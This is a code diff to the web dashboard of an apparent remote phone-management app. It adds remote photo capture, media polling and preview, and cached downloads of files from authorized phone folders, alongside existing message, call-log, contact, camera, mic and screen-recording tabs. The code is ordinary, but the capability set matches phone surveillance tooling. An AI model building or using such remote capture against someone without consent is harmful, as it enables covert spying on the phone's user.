@@ -335,7 +335,10 @@ function setPhoneTab(tabId) {
   if (activePhoneTab === "messages") refreshMessagesPanel().catch(() => {});
   if (activePhoneTab === "call-logs") refreshCallLogsPanel().catch(() => {});
   if (activePhoneTab === "contacts") refreshContactsPanel().catch(() => {});
-  if (activePhoneTab === "files") refreshFilesPanel().catch(() => {});
+  if (activePhoneTab === "files") {
+    const body = document.getElementById("files-panel-body");
+    refreshFilesPanel({ silent: Boolean(body?.querySelector(".files-grid, ul")) }).catch(() => {});
+  }
   if (activePhoneTab === "screen") updateScreenStatusUi();
   if (activePhoneTab === "recording") refreshRecordingsPanel().catch(() => {});
   if (activePhoneTab === "apps") refreshAppsPanel().catch(() => {});
@@ -637,8 +640,10 @@ let imageZoomState = null;
 let publicIceServers = [{ urls: "stun:stun.l.google.com:19302" }];
 /** @type {Map<string, LiveSession>} */
 const liveByDevice = new Map();
-/** @type {Map<string, Array<{ localId: string, mediaId?: string, fileName: string, objectUrl: string, downloadUrl?: string, createdAt: number, sizeBytes: number, status: string }>>} */
+/** @type {Map<string, Array<{ localId: string, mediaId?: string, kind?: string, fileName: string, objectUrl: string, downloadUrl?: string, createdAt: number, sizeBytes: number, status: string }>>} */
 const liveVideoClipsByDevice = new Map();
+/** @type {Map<string, ReturnType<typeof setInterval>>} */
+const liveCapturesPollByDevice = new Map();
 /** Independent screen-mirror sessions (do not share camera liveByDevice). */
 /** @type {Map<string, LiveSession>} */
 const screenLiveByDevice = new Map();
@@ -998,8 +1003,8 @@ function renderDevices(devices, clients) {
             </div>
             <div class="live-captures surface" data-captures-for="${id}">
               <div class="live-captures-head">
-                <strong>Saved videos</strong>
-                <span class="muted">Live camera + mic · play / download below</span>
+                <strong>Saved photos &amp; videos</strong>
+                <span class="muted">Captured from your phone · view / download below</span>
               </div>
               <div class="live-captures-list" data-captures-list-for="${id}"></div>
             </div>
@@ -1040,6 +1045,16 @@ function renderDevices(devices, clients) {
         if (action === "SWITCH_CAMERA" || action === "CAPTURE_PHOTO") {
           btn.classList.add("is-active");
           setTimeout(() => btn.classList.remove("is-active"), 450);
+        }
+        if (action === "CAPTURE_PHOTO") {
+          setDeviceStatus(deviceId, "Capturing photo…");
+          sendCommand(deviceId, action)
+            .then(() => {
+              startLiveCapturesPoll(deviceId);
+              nudgeLiveVideoPlayback(deviceId);
+            })
+            .catch(() => {});
+          return;
         }
         sendCommand(deviceId, action).catch(() => {});
       });
@@ -1287,6 +1302,7 @@ async function finalizeLiveBrowserVideoRecording(deviceId, chunks, mimeType) {
   const localId = `local_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
   const clip = {
     localId,
+    kind: "video",
     fileName,
     objectUrl,
     createdAt: Date.now(),
@@ -1367,6 +1383,67 @@ async function uploadLiveVideoClip(deviceId, blob, fileName, contentType) {
 /**
  * @param {string} deviceId
  */
+function nudgeLiveVideoPlayback(deviceId) {
+  const videoEl = deviceList?.querySelector(
+    `video[data-video-for="${CSS.escape(deviceId)}"]`
+  );
+  if (!videoEl) return;
+  const stream = videoEl.srcObject;
+  if (!(stream instanceof MediaStream)) return;
+  const track = stream.getVideoTracks()[0];
+  if (track && track.readyState === "live" && !track.enabled) {
+    track.enabled = true;
+  }
+  videoEl.play().catch(() => {});
+}
+
+/**
+ * Poll cloud media after capture so new photos appear without a page refresh.
+ * @param {string} deviceId
+ */
+function startLiveCapturesPoll(deviceId) {
+  stopLiveCapturesPoll(deviceId);
+  const startedAt = Date.now();
+  let attempts = 0;
+  const tick = async () => {
+    attempts += 1;
+    await hydrateLiveVideoClips(deviceId);
+    const items = liveVideoClipsByDevice.get(deviceId) || [];
+    const freshPhoto = items.find(
+      (c) =>
+        c.kind === "photo" &&
+        Number(c.createdAt || 0) >= startedAt - 5000 &&
+        (c.downloadUrl || c.objectUrl)
+    );
+    if (freshPhoto) {
+      setDeviceStatus(deviceId, "Photo saved below.");
+      nudgeLiveVideoPlayback(deviceId);
+      stopLiveCapturesPoll(deviceId);
+      return;
+    }
+    if (attempts >= 16) {
+      setDeviceStatus(deviceId, "Photo capture sent — check below shortly.");
+      nudgeLiveVideoPlayback(deviceId);
+      stopLiveCapturesPoll(deviceId);
+    }
+  };
+  tick();
+  const timer = setInterval(() => {
+    tick();
+  }, 2000);
+  liveCapturesPollByDevice.set(deviceId, timer);
+}
+
+/** @param {string} deviceId */
+function stopLiveCapturesPoll(deviceId) {
+  const timer = liveCapturesPollByDevice.get(deviceId);
+  if (timer) clearInterval(timer);
+  liveCapturesPollByDevice.delete(deviceId);
+}
+
+/**
+ * @param {string} deviceId
+ */
 function renderLiveVideoClips(deviceId) {
   if (!deviceList) return;
   const el = deviceList.querySelector(
@@ -1375,13 +1452,13 @@ function renderLiveVideoClips(deviceId) {
   if (!el) return;
   const items = liveVideoClipsByDevice.get(deviceId) || [];
   if (!items.length) {
-    el.innerHTML = `<p class="muted live-captures-empty">No videos yet. Tap Start video (includes mic), then Stop — the file appears here and is not kept on the phone.</p>`;
+    el.innerHTML = `<p class="muted live-captures-empty">No photos or videos yet. Tap <strong>Capture photo</strong> or <strong>Start video</strong> — files appear here automatically.</p>`;
     return;
   }
   el.innerHTML = items
     .map((clip) => {
       const url = escapeHtml(clip.downloadUrl || clip.objectUrl || "");
-      const name = escapeHtml(clip.fileName || "video");
+      const name = escapeHtml(clip.fileName || (clip.kind === "photo" ? "photo" : "video"));
       const when = escapeHtml(
         clip.createdAt ? new Date(clip.createdAt).toLocaleString() : ""
       );
@@ -1390,14 +1467,19 @@ function renderLiveVideoClips(deviceId) {
         : "";
       const status = escapeHtml(clip.status || "Saved");
       const mediaId = escapeHtml(clip.mediaId || "");
+      const kind = String(clip.kind || "video");
       const deleteBtn = clip.mediaId
         ? `<button type="button" class="btn-danger btn-live-media-delete" data-media-id="${mediaId}" data-device-id="${escapeHtml(deviceId)}">Delete</button>`
         : "";
+      const preview =
+        kind === "photo"
+          ? `<img class="live-capture-preview" src="${url}" alt="${name}" loading="lazy" />`
+          : `<video class="live-capture-preview" src="${url}" controls playsinline preload="metadata"></video>`;
       return `<article class="live-capture-row">
-        <video class="live-capture-preview" src="${url}" controls playsinline preload="metadata"></video>
+        ${preview}
         <div class="live-capture-meta">
           <strong>${name}</strong>
-          <span class="muted">${when}${size ? ` · ${escapeHtml(size)}` : ""} · ${status}</span>
+          <span class="muted">${kind === "photo" ? "Photo" : "Video"}${when ? ` · ${when}` : ""}${size ? ` · ${escapeHtml(size)}` : ""} · ${status}</span>
           <div class="live-capture-actions">
             <a class="btn-secondary" href="${url}" download="${name}" target="_blank" rel="noopener">Download</a>
             ${deleteBtn}
@@ -1448,21 +1530,35 @@ async function hydrateLiveVideoClips(deviceId) {
   try {
     const data = await api("/api/device/media?limit=40");
     const remote = (data.media || [])
-      .filter(
-        (m) =>
-          String(m.kind || "") === "video" &&
-          (!m.deviceId || String(m.deviceId) === String(deviceId))
-      )
-      .map((m) => ({
-        localId: m.mediaId,
-        mediaId: m.mediaId,
-        fileName: m.fileName || "video",
-        objectUrl: m.downloadUrl || "",
-        downloadUrl: m.downloadUrl || "",
-        createdAt: Number(m.createdAt || 0),
-        sizeBytes: Number(m.sizeBytes || 0),
-        status: "Saved",
-      }));
+      .filter((m) => {
+        const kind = String(m.kind || "");
+        const isPhoto =
+          kind === "photo" ||
+          kind === "image" ||
+          String(m.contentType || "").startsWith("image/");
+        const isVideo =
+          kind === "video" || String(m.contentType || "").startsWith("video/");
+        if (!isPhoto && !isVideo) return false;
+        return !m.deviceId || String(m.deviceId) === String(deviceId);
+      })
+      .map((m) => {
+        const kind =
+          String(m.kind || "") === "photo" ||
+          String(m.contentType || "").startsWith("image/")
+            ? "photo"
+            : "video";
+        return {
+          localId: m.mediaId,
+          mediaId: m.mediaId,
+          kind,
+          fileName: m.fileName || (kind === "photo" ? "photo.jpg" : "video"),
+          objectUrl: m.downloadUrl || "",
+          downloadUrl: m.downloadUrl || "",
+          createdAt: Number(m.createdAt || 0),
+          sizeBytes: Number(m.sizeBytes || 0),
+          status: "Saved",
+        };
+      });
     const local = (liveVideoClipsByDevice.get(deviceId) || []).filter(
       (c) => !c.mediaId || !remote.some((r) => r.mediaId === c.mediaId)
     );
@@ -2214,6 +2310,7 @@ async function endLiveSession(deviceId, reason) {
  * @param {boolean} endOnServer
  */
 function cleanupLive(deviceId, endOnServer) {
+  stopLiveCapturesPoll(deviceId);
   const live = liveByDevice.get(deviceId);
   if (live?.browserVideoRecorder) {
     try {
@@ -5209,6 +5306,285 @@ function isAudioEntry(entry) {
   return mime.startsWith("audio/") || /\.(mp3|m4a|aac|wav|ogg|flac|wma)$/i.test(name);
 }
 
+function isImageEntry(entry) {
+  const mime = String(entry.mimeType || "").toLowerCase();
+  const name = String(entry.name || "").toLowerCase();
+  return mime.startsWith("image/") || /\.(jpg|jpeg|png|gif|webp|bmp|heic)$/i.test(name);
+}
+
+function isVideoEntry(entry) {
+  const mime = String(entry.mimeType || "").toLowerCase();
+  const name = String(entry.name || "").toLowerCase();
+  return mime.startsWith("video/") || /\.(mp4|webm|mkv|mov|3gp)$/i.test(name);
+}
+
+function filesMediaKind(entry) {
+  if (isImageEntry(entry)) return "image";
+  if (isVideoEntry(entry)) return "video";
+  if (isAudioEntry(entry)) return "audio";
+  return "file";
+}
+
+function filesCacheKey(deviceId, entry) {
+  const rel = normalizeFilesPath(entry.relativePath || entry.name || "");
+  const grant = String(entry.folderGrantId || filesBrowse.grantId || "");
+  return `file::${deviceId}::${grant}::${rel}`;
+}
+
+function filesActionLabel(entry) {
+  const kind = filesMediaKind(entry);
+  if (kind === "image") return "View";
+  if (kind === "video" || kind === "audio") return "Play";
+  return "Download";
+}
+
+/** @type {Map<string, { status: string, progress: number, mimeType: string, displayName: string, type: string, objectUrl?: string, blob?: Blob }>} */
+const filesItemState = new Map();
+let filesPanelRenderKey = "";
+
+function setFilesSyncStatus(text) {
+  const el = document.getElementById("files-sync-status");
+  if (!el) return;
+  const msg = String(text || "").trim();
+  el.textContent = msg;
+  el.hidden = !msg;
+}
+
+function paintFilesButton(btn, state) {
+  if (!btn) return;
+  const card = btn.closest(".file-card");
+  btn.classList.remove("btn-file-progress", "btn-file-ready", "btn-file-error");
+  card?.classList.remove("file-card-downloading", "file-card-ready", "file-card-error");
+  if (state?.status === "downloading") {
+    const p = Math.max(0, Math.min(100, Number(state.progress) || 0));
+    btn.textContent = `${p}%`;
+    btn.disabled = true;
+    btn.classList.add("btn-file-progress");
+    btn.style.setProperty("--file-progress", `${p}%`);
+    card?.classList.add("file-card-downloading");
+    return;
+  }
+  btn.disabled = false;
+  btn.style.removeProperty("--file-progress");
+  if (state?.status === "ready") {
+    btn.textContent = filesActionLabel({
+      mimeType: state.mimeType,
+      name: state.displayName,
+    });
+    btn.classList.add("btn-file-ready");
+    card?.classList.add("file-card-ready");
+    return;
+  }
+  if (state?.status === "error") {
+    btn.textContent = "Retry";
+    btn.classList.add("btn-file-error");
+    card?.classList.add("file-card-error");
+    return;
+  }
+  btn.textContent = "Download";
+}
+
+async function cacheFilesBlob(key, meta, blob) {
+  await galleryCachePut({
+    key,
+    blob,
+    mimeType: meta.mimeType || blob.type || "application/octet-stream",
+    displayName: meta.displayName || meta.name || "file",
+    type: meta.type || filesMediaKind(meta),
+    sizeBytes: meta.sizeBytes || blob.size || 0,
+    savedAt: Date.now(),
+  });
+  const prev = filesItemState.get(key);
+  if (prev?.objectUrl) {
+    try {
+      URL.revokeObjectURL(prev.objectUrl);
+    } catch {
+      /* ignore */
+    }
+  }
+  const state = {
+    status: "ready",
+    progress: 100,
+    mimeType: meta.mimeType || blob.type || "application/octet-stream",
+    displayName: meta.displayName || meta.name || "file",
+    type: meta.type || filesMediaKind(meta),
+    objectUrl: URL.createObjectURL(blob),
+    blob,
+  };
+  filesItemState.set(key, state);
+  return state;
+}
+
+function closeFilesInlineViewer() {
+  const wrap = document.getElementById("files-inline-viewer");
+  const body = document.getElementById("files-inline-body");
+  if (body) body.innerHTML = "";
+  if (wrap) wrap.hidden = true;
+}
+
+async function showFilesInlinePreview(key) {
+  const state = filesItemState.get(key);
+  if (!state || state.status !== "ready") return;
+  const url = state.objectUrl || (await ensureGalleryObjectUrl(key, state));
+  const wrap = document.getElementById("files-inline-viewer");
+  const body = document.getElementById("files-inline-body");
+  const title = document.getElementById("files-inline-title");
+  if (!wrap || !body) return;
+  if (title) title.textContent = state.displayName || "Preview";
+  body.innerHTML = "";
+  const mime = String(state.mimeType || "").toLowerCase();
+  const kind = state.type || filesMediaKind({ mimeType: mime, name: state.displayName });
+  if (kind === "image") {
+    const img = document.createElement("img");
+    img.src = url;
+    img.alt = state.displayName || "image";
+    body.appendChild(img);
+  } else if (kind === "video") {
+    const video = document.createElement("video");
+    video.src = url;
+    video.controls = true;
+    video.playsInline = true;
+    video.preload = "metadata";
+    body.appendChild(video);
+    video.play().catch(() => {});
+  } else if (kind === "audio") {
+    const audio = document.createElement("audio");
+    audio.src = url;
+    audio.controls = true;
+    audio.preload = "metadata";
+    body.appendChild(audio);
+    audio.play().catch(() => {});
+  } else {
+    const link = document.createElement("a");
+    link.href = url;
+    link.download = state.displayName || "file";
+    link.className = "btn-secondary";
+    link.textContent = "Download file";
+    body.appendChild(link);
+  }
+  wrap.hidden = false;
+  wrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
+}
+
+async function findReadyFileTransfer(deviceId, entry) {
+  const data = await api(`/api/device/transfers?deviceId=${encodeURIComponent(deviceId)}`);
+  const rows = data.transfers || [];
+  const rel = normalizeFilesPath(entry.relativePath || entry.name || "");
+  const docId = String(entry.documentId || entry.name || "");
+  return (
+    rows.find(
+      (t) =>
+        String(t.deviceId || "") === deviceId &&
+        t.status === "ready" &&
+        (t.storagePath || t.downloadUrl) &&
+        (String(t.sourceReference || "") === docId ||
+          normalizeFilesPath(t.relativePath || "") === rel)
+    ) || null
+  );
+}
+
+async function downloadFileItem(deviceId, entry, btn) {
+  const key = filesCacheKey(deviceId, entry);
+  const existing = filesItemState.get(key);
+  if (existing?.status === "ready") {
+    paintFilesButton(btn, existing);
+    await showFilesInlinePreview(key);
+    return;
+  }
+  const cached = await galleryCacheGet(key);
+  if (cached?.blob) {
+    const state = await cacheFilesBlob(
+      key,
+      {
+        ...entry,
+        mimeType: cached.mimeType || entry.mimeType,
+        displayName: cached.displayName || entry.name,
+        type: cached.type || filesMediaKind(entry),
+      },
+      cached.blob
+    );
+    paintFilesButton(btn, state);
+    await showFilesInlinePreview(key);
+    return;
+  }
+
+  let state = {
+    status: "downloading",
+    progress: 3,
+    mimeType: entry.mimeType || "application/octet-stream",
+    displayName: entry.name || "file",
+    type: filesMediaKind(entry),
+  };
+  filesItemState.set(key, state);
+  paintFilesButton(btn, state);
+  setFilesSyncStatus(`Downloading ${entry.name || "file"}…`);
+
+  try {
+    let transfer = await findReadyFileTransfer(deviceId, entry);
+    let transferId = transfer?.transferId || "";
+    let commandId = null;
+    if (!transfer) {
+      const clientId = requireClientId();
+      const res = await api("/api/device/files/command", {
+        method: "POST",
+        body: JSON.stringify({
+          deviceId,
+          clientId,
+          action: "FILE_DOWNLOAD_REQUEST",
+          folderGrantId: entry.folderGrantId,
+          documentId: entry.documentId || entry.name,
+          relativePath: entry.relativePath || entry.name,
+          sizeBytes: entry.sizeBytes || 0,
+          mimeType: entry.mimeType || "application/octet-stream",
+          displayName: entry.name,
+          payload: {
+            folderGrantId: entry.folderGrantId,
+            relativePath: entry.relativePath || entry.name,
+          },
+        }),
+      });
+      transferId = res.transfer?.transferId || "";
+      commandId = res.commandId || res.transfer?.commandId || null;
+      if (!transferId) throw new Error("Download did not start");
+    }
+
+    transfer = await pollGalleryTransfer(deviceId, transferId, commandId, (progress) => {
+      const p = Math.max(3, Math.min(99, Number(progress) || 3));
+      state = { ...state, status: "downloading", progress: p };
+      filesItemState.set(key, state);
+      paintFilesButton(btn, state);
+      setFilesSyncStatus(`Downloading ${entry.name || "file"}… ${p}%`);
+    });
+
+    const blob = await fetchTransferBlob(transfer);
+    const ready = await cacheFilesBlob(
+      key,
+      {
+        ...entry,
+        mimeType: transfer.mimeType || entry.mimeType || blob.type,
+        displayName: entry.name || "file",
+        type: filesMediaKind(entry),
+        sizeBytes: blob.size,
+      },
+      blob
+    );
+    paintFilesButton(btn, ready);
+    setFilesSyncStatus("");
+    await showFilesInlinePreview(key);
+  } catch (e) {
+    state = {
+      ...state,
+      status: "error",
+      progress: 0,
+      error: e instanceof Error ? e.message : String(e),
+    };
+    filesItemState.set(key, state);
+    paintFilesButton(btn, state);
+    setFilesSyncStatus("");
+    throw e;
+  }
+}
+
 /** @type {{ grantId: string, relativePath: string }} */
 let filesBrowse = { grantId: "", relativePath: "" };
 
@@ -5253,6 +5629,8 @@ async function listFilesFolder(deviceId, grantId, relativePath = "") {
   const path = normalizeFilesPath(relativePath);
   filesBrowse = { grantId, relativePath: path };
   updateFilesBreadcrumb();
+  closeFilesInlineViewer();
+  setFilesSyncStatus(`Listing ${path || "root"}…`);
   await api("/api/device/files/command", {
     method: "POST",
     body: JSON.stringify({
@@ -5264,80 +5642,27 @@ async function listFilesFolder(deviceId, grantId, relativePath = "") {
       payload: { folderGrantId: grantId, relativePath: path },
     }),
   });
-  // Wait for phone to write index, then show.
-  for (let i = 0; i < 8; i++) {
-    await new Promise((r) => setTimeout(r, 700));
-    await refreshFilesPanel();
-    const body = document.getElementById("files-panel-body");
-    if (body && !/Loading|Empty — tap List/i.test(body.textContent || "")) break;
+  const body = document.getElementById("files-panel-body");
+  const hasGrid = Boolean(body?.querySelector(".files-grid"));
+  await refreshFilesPanel({ silent: hasGrid });
+  for (let i = 0; i < 10; i++) {
+    await new Promise((r) => setTimeout(r, 650));
+    const hasEntries = await refreshFilesPanel({ silent: true });
+    if (hasEntries) break;
+    const folderCards = body?.querySelectorAll(".file-folder").length || 0;
+    if (folderCards > 0) break;
+    const text = body?.textContent || "";
+    if (i >= 2 && body?.querySelector("ul") && !/still loading/i.test(text)) break;
   }
+  setFilesSyncStatus("");
 }
 
-async function requestFileDownload(deviceId, entry, { play } = { play: false }) {
-  const clientId = requireClientId();
-  const res = await api("/api/device/files/command", {
-    method: "POST",
-    body: JSON.stringify({
-      deviceId,
-      clientId,
-      action: "FILE_DOWNLOAD_REQUEST",
-      folderGrantId: entry.folderGrantId,
-      documentId: entry.documentId || entry.name,
-      relativePath: entry.relativePath || entry.name,
-      sizeBytes: entry.sizeBytes || 0,
-      mimeType: entry.mimeType || "audio/mpeg",
-      displayName: entry.name,
-      payload: {
-        folderGrantId: entry.folderGrantId,
-        relativePath: entry.relativePath || entry.name,
-      },
-    }),
-  });
-  const transferId = res.transfer?.transferId;
-  if (!transferId) {
-    alert("Download did not start. Try again.");
-    return;
-  }
-  const label = document.getElementById("files-audio-label");
-  if (label) label.textContent = play ? `Preparing ${entry.name}…` : `Downloading ${entry.name}…`;
-  for (let i = 0; i < 20; i++) {
-    await new Promise((r) => setTimeout(r, 1500));
-    const data = await api(`/api/device/transfers?deviceId=${encodeURIComponent(deviceId)}`);
-    const t = (data.transfers || []).find((x) => x.transferId === transferId);
-    if (!t) continue;
-    if (t.status === "ready" && (t.downloadUrl || t.storagePath)) {
-      let url = t.downloadUrl || "";
-      if (!url && t.storagePath && storage) {
-        try {
-          const blob = await getBlob(storageRef(storage, t.storagePath));
-          url = URL.createObjectURL(blob);
-        } catch {
-          /* keep empty */
-        }
-      }
-      if (!url) continue;
-      if (play) {
-        const wrap = document.getElementById("files-audio-player");
-        const audio = document.getElementById("files-audio");
-        if (wrap) wrap.hidden = false;
-        if (label) label.textContent = entry.name;
-        if (audio) {
-          audio.src = url;
-          audio.play().catch(() => {});
-        }
-      } else {
-        window.open(url, "_blank", "noopener");
-      }
-      return;
-    }
-    if (t.status === "failed" || t.status === "cancelled") {
-      throw new Error(t.error || `Transfer ${t.status}`);
-    }
-  }
-  alert("Still preparing. Wait a moment and try again.");
-}
-
-async function refreshFilesPanel() {
+/**
+ * @param {{ silent?: boolean }} [options]
+ * @returns {Promise<boolean>} true when folder entries are shown
+ */
+async function refreshFilesPanel(options = {}) {
+  const silent = Boolean(options.silent);
   if (!cachedDevices.length) await refreshDevices().catch(() => {});
   fillWorkspaceDeviceSelect();
   syncHiddenDeviceSelects(selectedWorkspaceDeviceId);
@@ -5346,10 +5671,12 @@ async function refreshFilesPanel() {
   if (!body) return;
   if (!deviceId) {
     body.textContent = "No devices.";
-    return;
+    return false;
   }
   updateFilesBreadcrumb();
-  body.textContent = "Loading…";
+  if (!silent) {
+    body.textContent = "Loading…";
+  }
   try {
     const data = await api(`/api/device/files?deviceId=${encodeURIComponent(deviceId)}`);
     const folders = data.folders || [];
@@ -5374,6 +5701,19 @@ async function refreshFilesPanel() {
           sensitivity: "base",
         });
       });
+
+    const renderKey = JSON.stringify({
+      deviceId,
+      grantId,
+      curPath,
+      folders: folders.map((f) => `${f.grantId}:${f.connected}`),
+      entries: entries.map((e) => `${e.relativePath || e.name}:${e.sizeBytes}:${e.isDirectory}`),
+    });
+    const hasEntries = entries.length > 0;
+    if (silent && renderKey === filesPanelRenderKey && body.querySelector(".files-grid")) {
+      return hasEntries;
+    }
+    filesPanelRenderKey = renderKey;
 
     body.innerHTML = `
       <h3>Authorized folders</h3>
@@ -5401,13 +5741,38 @@ async function refreshFilesPanel() {
                   </button>`;
                 }
                 const audio = isAudioEntry(e);
+                const image = isImageEntry(e);
+                const video = isVideoEntry(e);
                 const meta = `${escapeHtml(e.mimeType || "file")} · ${Math.round((e.sizeBytes || 0) / 1024)} KB`;
-                return `<article class="file-card" data-file-idx="${idx}">
+                const key = filesCacheKey(deviceId, e);
+                const st = filesItemState.get(key);
+                let btnLabel = "Download";
+                let btnClass = "btn-secondary btn-file-dl";
+                let cardClass = "file-card";
+                if (st?.status === "downloading") {
+                  btnLabel = `${Math.max(0, Math.min(100, Number(st.progress) || 0))}%`;
+                  btnClass += " btn-file-progress";
+                  cardClass += " file-card-downloading";
+                } else if (st?.status === "ready") {
+                  btnLabel = filesActionLabel(e);
+                  btnClass += " btn-file-ready";
+                  cardClass += " file-card-ready";
+                } else if (st?.status === "error") {
+                  btnLabel = "Retry";
+                  btnClass += " btn-file-error";
+                  cardClass += " file-card-error";
+                } else if (image || video || audio) {
+                  btnLabel = filesActionLabel(e);
+                }
+                const progressStyle =
+                  st?.status === "downloading"
+                    ? ` style="--file-progress:${Math.max(0, Math.min(100, Number(st.progress) || 0))}%"`
+                    : "";
+                return `<article class="${cardClass}" data-file-idx="${idx}">
                   <strong>${escapeHtml(e.name || "")}</strong>
                   <span class="muted">${meta}</span>
                   <div class="file-card-actions">
-                    ${audio ? `<button type="button" class="btn-primary btn-file-play">Play</button>` : ""}
-                    <button type="button" class="btn-secondary btn-file-dl">Download</button>
+                    <button type="button" class="${btnClass}" data-file-key="${escapeHtml(key)}"${progressStyle} ${st?.status === "downloading" ? "disabled" : ""}>${escapeHtml(btnLabel)}</button>
                   </div>
                 </article>`;
               })
@@ -5440,36 +5805,58 @@ async function refreshFilesPanel() {
         const next = normalizeFilesPath(entry.relativePath || entry.name || "");
         if (!g || !next) return;
         try {
-          body.textContent = `Opening ${entry.name || next}…`;
+          setFilesSyncStatus(`Opening ${entry.name || next}…`);
           await listFilesFolder(deviceId, g, next);
         } catch (e) {
           alert(e instanceof Error ? e.message : String(e));
+          setFilesSyncStatus("");
           refreshFilesPanel().catch(() => {});
         }
       });
     });
 
+    await Promise.all(
+      entries
+        .filter((e) => !e.isDirectory)
+        .map(async (entry) => {
+          const key = filesCacheKey(deviceId, entry);
+          if (filesItemState.get(key)?.status === "ready") return;
+          const cached = await galleryCacheGet(key);
+          if (!cached?.blob) return;
+          await cacheFilesBlob(
+            key,
+            {
+              ...entry,
+              mimeType: cached.mimeType || entry.mimeType,
+              displayName: cached.displayName || entry.name,
+              type: cached.type || filesMediaKind(entry),
+            },
+            cached.blob
+          );
+          const btn = body.querySelector(`[data-file-key="${CSS.escape(key)}"]`);
+          paintFilesButton(btn, filesItemState.get(key));
+        })
+    );
+
     body.querySelectorAll(".file-card[data-file-idx]").forEach((card) => {
       const idx = Number(card.getAttribute("data-file-idx"));
       const entry = entries[idx];
-      if (!entry) return;
-      card.querySelector(".btn-file-play")?.addEventListener("click", async () => {
+      if (!entry || entry.isDirectory) return;
+      const btn = card.querySelector(".btn-file-dl");
+      if (!btn) return;
+      btn.addEventListener("click", async () => {
         try {
-          await requestFileDownload(deviceId, entry, { play: true });
-        } catch (e) {
-          alert(e instanceof Error ? e.message : String(e));
-        }
-      });
-      card.querySelector(".btn-file-dl")?.addEventListener("click", async () => {
-        try {
-          await requestFileDownload(deviceId, entry, { play: false });
+          await downloadFileItem(deviceId, entry, btn);
         } catch (e) {
           alert(e instanceof Error ? e.message : String(e));
         }
       });
     });
+    body.classList.remove("muted");
+    return hasEntries;
   } catch (e) {
     body.textContent = e instanceof Error ? e.message : String(e);
+    return false;
   }
 }
 
@@ -5816,7 +6203,11 @@ document.getElementById("contacts-search")?.addEventListener("input", () => {
   clearTimeout(contactsSearchTimer);
   contactsSearchTimer = setTimeout(() => refreshContactsPanel().catch(() => {}), 280);
 });
-document.getElementById("btn-files-refresh")?.addEventListener("click", () => refreshFilesPanel());
+document.getElementById("btn-files-refresh")?.addEventListener("click", () => {
+  const body = document.getElementById("files-panel-body");
+  refreshFilesPanel({ silent: Boolean(body?.querySelector(".files-grid, ul")) }).catch(() => {});
+});
+document.getElementById("btn-files-inline-close")?.addEventListener("click", () => closeFilesInlineViewer());
 document.getElementById("btn-files-up")?.addEventListener("click", async () => {
   try {
     const deviceId = selectedWorkspaceDeviceId || document.getElementById("files-device-select")?.value;
@@ -6229,6 +6620,9 @@ function applyRecUiFromStatus(status, durationMs) {
   } else if (/Waiting|Permission/i.test(s)) {
     setRecButtonUi("recording");
     stopLocalRecTimer();
+  } else if (/^Cancelled$/i.test(s)) {
+    setRecButtonUi("failed");
+    stopLocalRecTimer();
   } else {
     setRecButtonUi("idle");
     stopLocalRecTimer();
@@ -6250,13 +6644,149 @@ function startRecordingsPoll(maxMs = 90000) {
     try {
       await refreshRecordingsPanel();
       const badge = document.getElementById("rec-status")?.textContent || "";
-      if (/^(Completed|Failed|Idle)$/i.test(badge) || Date.now() - started > maxMs) {
+      if (/^(Completed|Failed|Cancelled)$/i.test(badge) || Date.now() - started > maxMs) {
         stopRecordingsPoll();
       }
     } catch {
       /* keep polling briefly */
     }
   }, 1000);
+}
+
+/** @type {Map<string, { status: string, progress: number, displayName: string, objectUrl?: string, blob?: Blob }>} */
+const recItemState = new Map();
+
+function recCacheKey(deviceId, transferId) {
+  return `rec::${deviceId}::${transferId}`;
+}
+
+function paintRecButton(btn, state) {
+  if (!btn) return;
+  btn.classList.remove("btn-file-progress", "btn-file-ready", "btn-file-error");
+  if (state?.status === "downloading") {
+    const p = Math.max(0, Math.min(100, Number(state.progress) || 0));
+    btn.textContent = `${p}%`;
+    btn.disabled = true;
+    btn.classList.add("btn-file-progress");
+    btn.style.setProperty("--file-progress", `${p}%`);
+    return;
+  }
+  btn.disabled = false;
+  btn.style.removeProperty("--file-progress");
+  if (state?.status === "ready") {
+    btn.textContent = "Play";
+    btn.classList.add("btn-file-ready");
+    return;
+  }
+  if (state?.status === "error") {
+    btn.textContent = "Retry";
+    btn.classList.add("btn-file-error");
+    return;
+  }
+  btn.textContent = "Download";
+}
+
+function closeRecInlineViewer() {
+  const wrap = document.getElementById("rec-inline-viewer");
+  const body = document.getElementById("rec-inline-body");
+  if (body) body.innerHTML = "";
+  if (wrap) wrap.hidden = true;
+}
+
+async function showRecInlinePreview(key) {
+  const state = recItemState.get(key);
+  if (!state || state.status !== "ready") return;
+  const url = state.objectUrl || (await ensureGalleryObjectUrl(key, state));
+  const wrap = document.getElementById("rec-inline-viewer");
+  const body = document.getElementById("rec-inline-body");
+  const title = document.getElementById("rec-inline-title");
+  if (!wrap || !body) return;
+  if (title) title.textContent = state.displayName || "Screen recording";
+  body.innerHTML = "";
+  const video = document.createElement("video");
+  video.src = url;
+  video.controls = true;
+  video.playsInline = true;
+  video.preload = "metadata";
+  body.appendChild(video);
+  wrap.hidden = false;
+  wrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
+  video.play().catch(() => {});
+}
+
+async function downloadRecordingItem(deviceId, meta, btn) {
+  const transferId = String(meta.transferId || "");
+  const key = recCacheKey(deviceId, transferId);
+  const existing = recItemState.get(key);
+  if (existing?.status === "ready") {
+    paintRecButton(btn, existing);
+    await showRecInlinePreview(key);
+    return;
+  }
+  const cached = await galleryCacheGet(key);
+  if (cached?.blob) {
+    const state = {
+      status: "ready",
+      progress: 100,
+      displayName: cached.displayName || meta.displayName || "Screen recording",
+      objectUrl: URL.createObjectURL(cached.blob),
+      blob: cached.blob,
+    };
+    recItemState.set(key, state);
+    paintRecButton(btn, state);
+    await showRecInlinePreview(key);
+    return;
+  }
+  let state = {
+    status: "downloading",
+    progress: 3,
+    displayName: meta.displayName || "Screen recording",
+  };
+  recItemState.set(key, state);
+  paintRecButton(btn, state);
+  try {
+    const data = await api(`/api/device/transfers?deviceId=${encodeURIComponent(deviceId)}`);
+    const rows = data.transfers || data.items || [];
+    let transfer = rows.find((x) => String(x.transferId || "") === transferId) || null;
+    if (!transfer || transfer.status !== "ready") {
+      throw new Error(
+        transfer
+          ? `Transfer status: ${transfer.status || "unknown"}`
+          : "Recording file not ready yet — wait until Completed, then try again."
+      );
+    }
+    transfer = await pollGalleryTransfer(deviceId, transferId, null, (progress) => {
+      const p = Math.max(3, Math.min(99, Number(progress) || 3));
+      state = { ...state, status: "downloading", progress: p };
+      recItemState.set(key, state);
